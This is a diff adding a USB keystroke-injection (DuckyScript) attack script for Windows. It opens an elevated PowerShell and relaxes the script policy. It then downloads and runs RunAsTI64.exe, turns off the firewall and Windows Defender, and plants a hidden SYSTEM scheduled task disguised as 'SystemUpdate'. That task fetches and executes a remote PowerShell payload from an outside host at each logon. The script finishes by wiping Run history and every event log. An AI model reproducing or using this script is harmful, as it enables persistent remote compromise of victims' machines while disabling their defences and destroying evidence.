@@ -1,0 +1,49 @@
+DELAY 1000
+GUI r
+DELAY 500
+REM
+REM Run Powershell with Admin Privileges 
+REM
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 50
+ENTER
+DELAY 500
+REM
+REM Enable Running Unsigned Scripts
+REM
+STRING set-executionpolicy remotesigned
+ENTER
+DELAY 500
+STRING A
+ENTER
+DELAY 100
+REM
+REM Clear Run History; Download and run RunAsTI.exe; exit
+REM
+STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $down = New-Object System.Net.WebClient; $url = 'https://github.com/jschicht/RunAsTI/raw/master/RunAsTI64.exe'; $file = 'RunAsTI64.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
+ENTER
+DELAY 1000
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 1000
+REM
+REM Disable Firewall; Kill WinDefend running at startup; Turn off WinDefend
+REM
+STRING netsh advfirewall set allprofiles state off & sc config WinDefend start= disabled & sc stop WinDefend
+ENTER
+DELAY 500
+REM
+REM Create schtask/persistence "SystemUpdate" at startup
+REM
+STRING schtasks /create /tn SystemUpdate /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.4:8000/Payload.ps1'''))'" /sc onlogon /ru System
+ENTER
+DELAY 500
+REM
+REM Clear all logs and Exit
+REM
+STRING powershell "wevtutil el | Foreach-Object {wevtutil cl "$_"}" & exit
+ENTER
